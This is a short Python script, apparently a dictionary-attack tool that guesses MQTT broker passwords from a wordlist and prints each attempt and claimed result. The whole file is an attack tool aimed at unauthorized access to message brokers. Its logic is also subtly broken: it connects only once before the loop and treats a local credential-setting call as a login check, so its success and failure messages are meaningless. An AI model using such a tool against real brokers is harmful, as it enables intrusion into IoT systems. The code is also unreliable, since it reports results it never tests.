import paho.mqtt.client as mqtt
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-H", "--host", help="MQTT broker host address", required=True)
parser.add_argument("-p", "--port", help="MQTT broker port number", type=int, default=1883)
parser.add_argument("-u", "--username", help="MQTT broker username", default="")
parser.add_argument("-w", "--wordlist", help="Path to the wordlist file", required=True)
args = parser.parse_args()

def on_connect(client, userdata, flags, rc):
    print("Connected with result code "+str(rc))

def on_message(client, userdata, msg):
    print(msg.topic+" "+str(msg.payload))

client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message

client.connect(args.host, args.port)

with open(args.wordlist, "r") as f:
    passwords = f.readlines()

for password in passwords:
    password = password.strip()
    print("Trying password: {}".format(password))
    rc = client.username_pw_set(args.username, password)
    if rc == mqtt.MQTT_ERR_SUCCESS:
        print("Login succeeded with password: {}".format(password))
        break
    else:
        print("Login failed with password: {}".format(password))

client.loop_forever()
